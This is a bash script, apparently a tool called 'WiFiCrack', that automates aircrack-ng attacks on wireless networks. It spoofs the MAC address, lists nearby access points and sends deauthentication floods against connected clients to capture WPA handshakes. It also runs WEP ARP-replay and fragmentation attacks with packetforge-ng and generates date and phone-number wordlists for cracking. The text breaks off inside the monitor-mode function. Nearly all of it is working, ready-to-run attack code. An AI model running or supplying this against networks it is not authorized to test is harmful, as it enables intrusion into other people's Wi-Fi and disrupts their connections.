#!/bin/bash

function help {
clear
echo "----------------------- WiFiCrack HELP -----------------------

1 --> Sets the selected WLAN interface in monitor mode and begins the cracking process.
e --> Enables monitor mode for selected WLAN interface.
d --> Disables monitor mode for selected WLAN interface.
w --> Generate phone number wordlist. 
h --> Shows this text.
v --> Calls nmcli and displays nearby Access Points.
s --> Shows technical info of the current WLAN interface.
c --> Change current interface (only shows if you have more than one interface)
t --> Test injection quality of the current WLAN interface. Without injection support some commands will not be able to run successfully.
q --> Exits the script.
"
}
function resolve_dependencies {
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo "${f:5:${#f}-13}"; done;)
    
    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK=" aircrack-ng "
    else
        unset AIRCRACK
    fi

    if [[ -z "$NMCLI" ]]; then
        NMCLI=" networkmanager "
    else
        unset NMCLI
    fi

    if [[ -z "$MACCHANGER" ]]; then
        MACCHANGER=" macchanger "
    else
        unset MACCHANGER
    fi

    if [[ -z "$XTERM" ]]; then
        XTERM=" xterm "
    else
        unset XTERM
    fi

    case "$DISTRO" in
        arch )
            INSTALL="pacman -S --noconfirm "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt-get -y install "
            ;;
        redhat )
            INSTALL="dnf -y install "
            ;;
        LinuxMint )
            INSTALL="apt-get -y install "
            ;;
        debian )
            INSTALL="apt-get -y install "
            ;;
        OpenSUSE )
            INSTALL="zypper -n install "
            ;;
        fedora )
            INSTALL="dnf -y install "
            ;;
        * )
            echo -ne "Unable to determine Linux Distribution! Install$AIRCRACK$NMCLI$MACCHANGER$XTERM manually."
            exit 1
    esac

    read -rp "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system, install now [yn] ? " DYN
    if [[ "$DYN" = [Yy] ]]; then
        $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
        resolve_dependencies
    else
        clear
        echo "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system."
        exit 1
    fi
else
    :
fi
}
function phones_wl {
clear
echo "------- Phone number generator, using crunch. -------"
echo
read -rp "Enter Phone Number digit length : " LENGTH
read -rp "Enter Phone prefix : " PREFIX
read -rp "Enter number of recurring digits (Press Enter to skip) : " RECURRING
TMP_1=${#PREFIX}
TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
TMP_4=$(echo "$TMP_3" | sed 's/%/X/g')
SUFFIX=".lst"
if [[ -z "$RECURRING" ]]; then
    crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
else
    crunch "$LENGTH" "$LENGTH" -d "$RECURRING" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
fi
GEN=$?
if [[ "$GEN" -eq 0 ]]; then
    echo
    echo "Wordlist successfully generated."
    read -rp "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
else
    echo "Either something went wrong or you entered no values, check function \"generate_wordlists\"."
    read -rp "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
fi
}
function dates_wl {
clear
# Change defaults here
MIN_DATE=1
MAX_DATE=31
MIN_MONTH=1
MAX_MONTH=12
MIN_YEAR=1945
MAX_YEAR=2017

SMIN_DATE=$MIN_DATE
SMAX_DATE=$MAX_DATE
SMIN_MONTH=$MIN_MONTH
SMAX_MONTH=$MAX_MONTH
SMIN_YEAR=$MIN_YEAR
SMAX_YEAR=$MAX_YEAR

clear
unset VAR
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter minimum DATE (Enter to use defaults) : " VAR
SMIN_DATE=$VAR
while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
    if [[ -z "$VAR" ]]; then
        SMIN_DATE=$MIN_DATE
        break
    elif [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; then
        SMIN_DATE=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
        SMIN_DATE=$VAR
    fi
done
unset VAR

clear
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter maximum DATE (Enter to use defaults) : " VAR
SMAX_DATE=$VAR
while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
    if [[ -z "$VAR" ]]; then
        SMAX_DATE=$MAX_DATE
        break
    elif [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; then
        SMAX_DATE=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
        SMAX_DATE=$VAR
    fi
done
unset VAR

clear
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter minimum MONTH (Enter to use defaults) : " VAR
SMIN_MONTH=$VAR
while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
    if [[ -z "$VAR" ]]; then
        SMIN_MONTH=$MIN_MONTH
        break
    elif [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; then
        SMIN_MONTH=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
        SMIN_MONTH=$VAR
    fi
done
unset VAR

clear
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter maximum MONTH (Enter to use defaults) : " VAR
SMAX_MONTH=$VAR
while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
    if [[ -z "$VAR" ]]; then
        SMAX_MONTH=$MAX_MONTH
        break
    elif [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; then
        SMAX_MONTH=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
        SMAX_MONTH=$VAR
    fi
done
unset VAR

clear
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter minimum YEAR (Enter to use defaults) : " VAR
SMIN_YEAR=$VAR
while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
    if [[ -z "$VAR" ]]; then
        SMIN_YEAR=$MIN_YEAR
        break
    elif [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; then
        SMIN_YEAR=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
        SMIN_YEAR=$VAR
    fi
done
unset VAR

clear
echo "--------------------- Date Generator ---------------------"
echo
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
read -rp "Enter maximum YEAR (Enter to use defaults) : " VAR
SMAX_YEAR=$VAR
while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
    if [[ -z "$VAR" ]]; then
        SMAX_YEAR=$MAX_YEAR
        break
    elif [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; then
        SMAX_YEAR=$VAR
        break
    else
        read -rp "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
        SMAX_YEAR=$VAR
    fi
done
unset VAR

clear
echo "--------------------- <Date Generator> ---------------------"
echo
echo "The program will generate the following wordlist." 
echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
echo
echo "Confirm ? [yn] "
echo
while read -rn1 KEY
do
    case "$KEY" in
        [Yy] )
            DATES=$(seq -w "$SMIN_DATE" "$SMAX_DATE")
            MONTHS=$(seq -w "$SMIN_MONTH" "$SMAX_MONTH")
            YEARS=$(seq -w "$SMIN_YEAR" "$SMAX_YEAR")
            for i in ${YEARS[@]}; do
                for j in ${MONTHS[@]}; do
                    for s in ${DATES[@]}; do
                        echo "$s$j$i" >> "$SMIN_YEAR-$SMAX_YEAR.lst"
                        SUCCESS="$?"
                    done
                done
            done
            if [[ "$?" = 0 ]]; then
                echo 
                echo "Wordlist generated successfully!"
                echo "Saved as $SMIN_YEAR-$SMAX_YEAR.lst"
                echo
                read -rp "Press Enter to go back." KEY
                unset SUCCESS
                unset DATES
                unset MONTHS
                unset YEARS
                unset MIN_DATE
                unset MAX_DATE
                unset MIN_MONTH
                unset MAX_MONTH
                unset MIN_YEAR
                unset MAX_YEAR
                unset SMIN_DATE
                unset SMAX_DATE
                unset SMIN_MONTH
                unset SMAX_MONTH
                unset SMIN_YEAR
                unset SMAX_YEAR
                unset i
                unset j
                unset s
                go_back
            else
                read -rp "Something went wrong, check output." KEY
                unset SUCCESS
                unset DATES
                unset MONTHS
                unset YEARS
                unset MIN_DATE
                unset MAX_DATE
                unset MIN_MONTH
                unset MAX_MONTH
                unset MIN_YEAR
                unset MAX_YEAR
                unset SMIN_DATE
                unset SMAX_DATE
                unset SMIN_MONTH
                unset SMAX_MONTH
                unset SMIN_YEAR
                unset SMAX_YEAR
                unset i
                unset j
                unset s
                go_back
            fi
            ;;
        [Nn] )
            unset SUCCESS
            unset DATES
            unset MONTHS
            unset YEARS
            unset MIN_DATE
            unset MAX_DATE
            unset MIN_MONTH
            unset MAX_MONTH
            unset MIN_YEAR
            unset MAX_YEAR
            unset SMIN_DATE
            unset SMAX_DATE
            unset SMIN_MONTH
            unset SMAX_MONTH
            unset SMIN_YEAR
            unset SMAX_YEAR
            unset i
            unset j
            unset s
            go_back
            ;;
        * )
            echo -ne "\n[n] Cancel [y] Generate "
            ;;
    esac
done
}
function generate_wordlists {
clear

echo "---------------- Generate Wordlists ----------------"
echo
echo "d) Generate Dates"
echo "p) Generate Phone numbers"
echo
echo "c) Cancel"
echo
SELECT="Select : "
echo -n "$SELECT"
while read -rn1 WORD
do
    case "$WORD" in
        d )
            dates_wl
            break
            ;;
        p )
            CRUNCH=$(command -v crunch)
            if [[ -z "$CRUNCH" ]]; then
                echo
                echo "Crunch is not installed. Install it and try again."
                read -rp "Press Enter to go back..." KEY
                unset CRUNCH
                go_back
            fi
            phones_wl
            break
            ;;
        c )
            go_back
            break
            ;;
        * )
            echo -ne "\n$SELECT"
            ;;
    esac
done
}
function test_injection {
clear
TRY=y
if [[ -n "$STATE" ]]; then
    echo "Testing injection for $IFACE"
    RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
    if [[ -n "$RANGE" ]]; then
        while [[ "$TRY" = [Yy] ]]; 
        do
            RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
            WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
            if [[ -z "$RANGE" ]]; then
                WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
                if [[ -n "$WORKS" ]]; then
                    echo "WLAN interface ($IFACE) supports injection."
                    echo
                    if [[ "$FLAG" -eq 1 ]]; then
                        echo "Please wait..."
                        echo "Unseting monitor mode on $IFACE."
                        unset_mon >> /dev/null
                    fi
                    unset WORKS
                    unset RANGE
                    unset TRY
                    unset FLAG
                    break
                else
                    echo "WLAN interface ($IFACE) does NOT support injection."
                    echo
                    if [[ "$FLAG" -eq 1 ]]; then
                        echo "Please wait..."
                        echo "Unseting monitor mode on $IFACE."
                        unset_mon >> /dev/null
                    fi
                    unset WORKS
                    unset RANGE
                    unset TRY
                    unset FLAG
                    break
                fi
            else
                echo "Found 0 APs, consider relocating your WLAN interface."
                read -p "Try again ? [yn] " TRY
                unset RANGE
                echo "Please wait..."
                if [[ "$FLAG" -eq 1 ]]; then
                    echo "Please wait..."
                    echo "Unseting monitor mode on $IFACE."
                    unset_mon >> /dev/null
                fi
            fi
        done
    else
        WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
        if [[ -n "$WORKS" ]]; then
            echo "WLAN interface ($IFACE) supports injection."
            echo
            if [[ "$FLAG" -eq 1 ]]; then
                echo "Please wait..."
                echo "Unseting monitor mode on $IFACE."
                unset_mon >> /dev/null
            fi
            unset WORKS
            unset RANGE
            unset TRY
            unset FLAG
        else
            echo "WLAN interface ($IFACE) does NOT support injection."
            echo
            if [[ "$FLAG" -eq 1 ]]; then
                echo "Please wait..."
                echo "Unseting monitor mode on $IFACE."
                unset_mon >> /dev/null
            fi
            unset WORKS
            unset RANGE
            unset TRY
            unset FLAG
        fi
    fi
else
    echo
    echo "Please wait..."
    echo "Setting monitor mode on $IFACE."
    set_mon >> /dev/null
    FLAG=1
    test_injection
fi
unset WORKS
unset RANGE
unset TRY
unset FLAG
}
function choose_mode {
echo
echo "Select Cracking Mode : "
SELECT="Select : "
echo
echo "1) WEP"
echo "2) WPA 1/2"
echo
echo "c) Cancel"
echo
echo -n "$SELECT"
while read -rn1 MODE
do
    case "$MODE" in
        1 )
            MODE="WEP"
            list_APs
            set_mon
            wep_attacks
            break
            ;;
        2 )
            MODE="WPA"
            list_APs
            set_mon
            wpa_attacks
            break
            ;;
        c )
            go_back
            break
            ;;
        * )
            echo -ne "\n$SELECT"
            ;;
    esac
done
}
function list_APs {
clear
echo "----------------------- <Access Point Selection> -----------------------"
echo
echo "Filtered by : $MODE"
if [[ -n "$STATE" ]]; then
    echo
    echo "Please wait ..."
    unset_mon >> /dev/null
    sleep 5
fi
readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE | sort -u -t: -k1,1 )
if [[ -z "$LINES" ]]; then
    echo "No $MODE Networks found."
    echo
    read -rp "Press Enter to go back" KEY
    go_back
else
    echo
    echo "Select an AP and press Enter or Select 1 to rescan"
    echo
    echo "   SSID  CHAN    BSSID   SECURITY    SIGNAL"
    echo
    select CHOICE in "Scan Again" "${LINES[@]}"; do
        if [[ "$CHOICE" = "Scan Again" ]]; then
            list_APs
        fi
        [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    AP="$CHOICE"
    BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
    CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
    ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
    SIG=$(echo "$AP" | awk -F ':' '{print $NF}')
    CHANFLAG=1
    REPLY="$CHAN"
fi
}
function de-auth {
echo
read -rp "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
read -rp "How many times ? " TIMES
aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
}
function wpa_attacks {
clear
echo "------------ WPA1/2 4-Way Handshake Capture ------------"
read -rp "Press Enter to continue ? " KEY
IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
ESSID=$(tr -d ' ' <<< "$ESSID")
AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
echo "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
You capture a 4-Way Handshake by forcing an already connected client to de-auth, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake."
echo
echo
echo "When a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output."
echo

CNT="Are any clients connected ? [yn] "
echo "$CNT"
while read -rn1 YESNO
do
    case "$YESNO" in
        [Yy] )
            de-auth
            CONNECT="[c] Cancel [y] Try again [n] Change settings : "
            echo -n "$CONNECT"
            while read -rn1 CON
            do
                case "$CON" in
                    [Yy] )
                        echo
                        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
                        echo -n "$CONNECT"
                        ;;
                    [Nn] )
                        de-auth
                        echo -n "$CONNECT"
                        ;;
                    [Cc] )
                        kill "$(pgrep xterm)"
						clean_up
                        echo
                        unset YESNO
                        unset CONNECT
                        unset CON
                        unset ESSID
                        unset AIRODUMP
                        unset TIMES
                        unset CLIENT
                        unset CHAN
                        unset BSSID
                        read -rp "Press Enter to go back " KEY
                        go_back
                        break
                        ;;
                    * )
                        echo -ne "\n$CONNECT"
                        ;;
                esac
            done
            break
            ;;
        [Nn] )
            kill "$(pgrep xterm)"
            rm -f "$ESSID"*.netxml
            rm -f "$ESSID"*.cap
            rm -f "$ESSID"*.csv
            rm -f replay*.cap
            echo
            unset YESNO
            unset CONNECT
            unset CON
            unset ESSID
            unset AIRODUMP
            unset CHAN
            unset BSSID
            read -rp "Press Enter to go back " KEY
            go_back
            break
            ;;
        * )
            echo -ne "\n$CNT"
            ;;
    esac
done
}
function clean_up {
echo
read -rp "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
read -rp "Keep $ESSID.cap file ? [yn] " ANS
if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
    rm -f "$ESSID"*.netxml
    rm -f "$ESSID"*.csv
    rm -f replay*.cap
    if [[ -n "$FRAGMENT" ]]; then
        rm -f fragment*.xor
        rm -f "$ESSID".arp
    fi
elif [[ "$ASR" = [Yy] && "$ANS" = [Nn] ]]; then
    rm -f "$ESSID"*.netxml
    rm -f "$ESSID"*.cap
    rm -f "$ESSID"*.csv
    if [[ -n "$FRAGMENT" ]]; then
        rm -f fragment*.xor
        rm -f "$ESSID".arp
    fi
    rm -f replay*.cap
elif [[ "$ASR" = [Nn] ]]; then
    :
fi
}
function fragmentation { 
clear
echo "------------ WEP Fragmentation method ------------"
echo
read -rp "Press Enter to continue ? " KEY
if [[ -z "$STATE" ]]; then
    echo
    echo "Setting M/M on $IFACE"
    set_mon >> /dev/null
fi
echo
ESSID=$(tr -d ' ' <<< "$ESSID")
echo
COUNTER=0
until [[ "$COUNTER" -eq 3 ]]; do
    clear
    let COUNTER+=1
    echo "Attempting to Associate to $ESSID... $COUNTER/3"
    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
    SUCCESS=$?
    if [[ "$SUCCESS" = 0 ]]; then
        echo "Association successful!"
        echo "Initiating packetforge-ng"
        aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
        PRGA=$?
        echo
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ "$SUCCESS" != 0 ]]; then
    echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
    read -rp "Test injection now ? [yn] " INJ
    if [[ "$INJ" = [Yy] ]]; then
        test_injection
    fi
    echo
    echo "In some cases rebooting your computer usually fixes the Association failure."
    echo
    unset ESSID
    unset CHAN
    unset BSSID
    unset SUCCESS
    unset COUNTER
    unset PRGA
    read -rp "Press Enter to go back" KEY
    go_back
fi
aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
PRGA=$?
EXT=".arp"
if [[ "$PRGA" = 0 ]]; then
    FRAGMENT=$(find "$(pwd)" -name "fragment*.xor" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
    if [[ -z "$FRAGMENT" ]]; then
        echo
        echo "No .xor file found."
        echo
        unset ESSID
        unset CHAN
        unset BSSID
        unset PRGA
        unset EXT
        unset FRAGMENT
        unset INJ
        read -rp "Press Enter to go back" KEY
        go_back
    fi
    packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID""$EXT"
    CAPTURE="airodump-ng -c $CHAN --bssid $BSSID -w $ESSID $IFACE"
    env -u SESSION_MANAGER xterm -hold -e "$CAPTURE" &
    echo y | aireplay-ng -2 -r "$ESSID""$EXT" "$IFACE" &>/dev/null &
    clear
    echo 
    echo "Crack $ESSID now [yn] ? "
    while read -rn1 ANSWER
    do
        case "$ANSWER" in
            [Yy] )
                CAPFILE=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
                if [[ -z "$CAPFILE" ]]; then
                    echo
                    echo "No $ESSID.cap files found."
                    echo
                    kill "$(pgrep aireplay-ng)"
                    killall xterm
                    clean_up
                    unset ESSID
                    unset CHAN
                    unset BSSID
                    unset PRGA
                    unset EXT
                    unset FRAGMENT
                    unset INJ
                    unset CAPFILE
                    read -rp "Press Enter to go back" KEY
                    go_back
                fi
                CRACK="aircrack-ng -b $BSSID $CAPFILE"
                env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
                clear
                echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
                echo
                echo "WARNING! xterm windows will close, copy the password before continuing."
                echo
                read -rp "Press Enter to clean up files and go back..." KEY
                kill "$(pgrep aireplay-ng)"
                killall xterm
                clean_up
                unset ESSID
                unset CHAN
                unset BSSID
                unset PRGA
                unset EXT
                unset FRAGMENT
                unset INJ
                unset CAPTURE
                go_back
                ;;
            [Nn] )
                kill "$(pgrep aireplay-ng)"
                killall xterm
                clean_up
                unset ESSID
                unset CHAN
                unset BSSID
                unset PRGA
                unset EXT
                unset FRAGMENT
                unset INJ
                unset CAPTURE
                read -rp "Press Enter to go back" KEY
                go_back
                ;;
            * )
                echo -ne "\nInvalid choice, enter y or n "
                ;;
        esac
    done
else
    echo
    read -rp "Fragmentation method failed. Try Chop-Chop ?" ANSWER
    if [[ "$ANSWER" = [Yy] ]]; then
       echo "TODO"
       exit 1
    fi
fi
}
function arp_replay {
clear
echo "------------ WEP ARP replay method ------------"
echo
read -rp "Press Enter to continue ? " KEY
if [[ -z "$STATE" ]]; then
    echo
    echo "Setting M/M on $IFACE"
    set_mon >> /dev/null
fi
echo
ESSID=$(tr -d ' ' <<< "$ESSID")
AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
echo
COUNTER=0
until [[ "$COUNTER" -eq 3 ]]; do
    clear
    let COUNTER+=1
    echo "Attempting to Associate to $ESSID... $COUNTER/3"
    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
    SUCCESS=$?
    if [[ "$SUCCESS" = 0 ]]; then
        echo "Association successful!"
        echo "Initiating ARP Replay attack..."
        aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
        echo "Initiating packet capture"
        env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
        echo
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ "$SUCCESS" != 0 ]]; then
    echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
    read -rp "Test injection now ? [yn] " INJ
    if [[ "$INJ" = [Yy] ]]; then
        test_injection
    fi
    echo
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    read -rp "Press Enter to go back" KEY
    go_back
fi
echo "Wait for #Data in airodump-ng to reach at least 15K before you proceed..."
echo "Proceed ? [yn] "
while read -rn1 ANS
do
    case "$ANS" in
        [Yy] )
            CAP=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
            COMMAND="aircrack-ng $CAP"
            env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
            clear
            echo "Wait for aircrack-ng to finish, then copy the password."
            echo
            echo "WARNING! xterm windows will close, copy the password before continuing."
            echo
            read -rp "Press Enter to clean up files and go back..." KEY
            kill "$(pgrep aireplay-ng)"
            killall xterm
            clean_up
            unset ESSID
            unset AIRODUMP
            unset CHAN
            unset BSSID
            unset ANS
            unset CAP
            unset CHOICE
            unset INJ
            unset ANSWER
            read -rp "Press Enter to go back" KEY
            go_back
            ;;
        [Nn] )
            kill "$(pgrep aireplay-ng)"
            kill "$(pgrep xterm)"
            clean_up
            unset ESSID
            unset AIRODUMP
            unset CHAN
            unset BSSID
            unset ANS
            unset CAP
            unset CHOICE
            unset INJ
            unset ANSWER
            read -rp "Press Enter to exit and go back. " KEY
            go_back
            ;;
        * )
            echo -ne "\nInvalid answer, enter y or n "
            ;;
    esac
done
}
function wep_attacks {
clear
unset CHANFLAG
echo "-------------- Select Attack Method --------------"
echo
echo "You picked ($AP)"
echo
echo "AP Name       : $ESSID"
echo "AP Channel    : $CHAN"
echo "AP MAC        : $BSSID"
echo "AP Signal     : $SIG/100"
echo
PROMPT="Select : "
echo "1) ARP Replay Attack"
echo "2) Fragmentation Attack"
echo
echo "s) Select different AP"
echo "c) Cancel"
echo
echo -n "$PROMPT"
while read -rn1 SEL
do
    case "$SEL" in
        1 )
            arp_replay
            break
            ;;
        2 )
            fragmentation
            break
            ;;
        s )
            clear
            list_APs
            wep_attacks
            break
            ;;
        c )
            go_back
            break
            ;;
        * )
            echo -ne "\n$PROMPT"
            ;;
    esac
done
}
function show_info {
clear
ADDR=$(iw "$IFACE" info | grep addr | awk -F ' ' '{print $2}')
TYPE=$(iw "$IFACE" info | grep "type" | awk -F ' ' '{print $2}')
TXPOWER=$(iw "$IFACE" info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
NAME=$(iw "$IFACE" info | grep Interface | awk -F ' ' '{print $2}')
CHANNEL=$(iw "$IFACE" info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
echo "----------------------- WiFi Card Info -----------------------"
echo
echo "Name                          : $NAME"
echo "MAC Addr                      : $ADDR"
echo "Type                          : $TYPE"
echo "Channel                       : $CHANNEL"
echo "Transmit Power                : $TXPOWER"
unset ADDR
unset TYPE
unset TXPOWER
unset NAME
unset CHANNEL
}
function unset_mon {
if [[ -z "$STATE" ]]; then
    echo
    echo "Monitor mode was not set on $IFACE."
    sleep 2
else
    echo
    echo "Disabling Monitor Mode for $IFACE..."
    echo
    echo "Bringing $IFACE down..."
    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
    ifconfig "$IFACE" down >> /dev/null
    echo "Reverting MAC address to factory default..."
    macchanger -p "$IFACE"  >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig "$IFACE" up >> /dev/null
    echo "Disabling monitor mode for $IFACE..."
    airmon-ng stop "$IFACE" >> /dev/null
    echo "$IFACE is no longer in monitor mode."
    unset STATE
    sleep 2
    IFACE=$(sed 's/mon//g' <<< "$IFACE")
fi
}
function set_mon {
if [[ -z "$STATE" ]]; then
    LIST="1 2 3 4 5 6 7 8 9 10 11 12 13 14 131 132 132 133 133 134 134 135 136 136 137 137 138 138 36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 149 153 157 161 165"
    echo
    echo "Setting $IFACE in Monitor Mode..."
    echo
    echo "Creating new interface..."
    if [[ "$CHANFLAG" = 1 ]]; then
        clear
        echo "Setting $IFACE in Monitor Mode..."
        echo
        echo "Creating new interface..."
        echo
        echo "You picked ($AP)"
        echo "The new interface will be set on channel : $CHAN."
        echo
        airmon-ng start "$IFACE" "$REPLY" >> /dev/null
    else
        read -rp "Set Channel or (Press Enter to skip) : " REPLY
        if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then 
            airmon-ng start "$IFACE" "$REPLY" >> /dev/null
        elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then 
            airmon-ng start "$IFACE" >> /dev/null
        else
            echo "Invalid Channel \"$REPLY\" entered. "
            read -rp "Retry ? [yn] " ASK
            if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
                unset REPLY
                unset ASK
                unset LIST
                set_mon
            else
                echo
                echo "Either set a valid channel or press Enter to skip"
                unset REPLY
                unset ASK
                unset LIST
                sleep 3
                go_back
            fi
        fi
    fi
    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
    echo "Bringing $IFACE down..."
    ifconfig "$IFACE" down >> /dev/null
    echo "Changing MAC address for $IFACE"
    macchanger -m 00:11:22:33:44:55 "$IFACE" >> /dev/null
    echo "Bringing $IFACE up..."
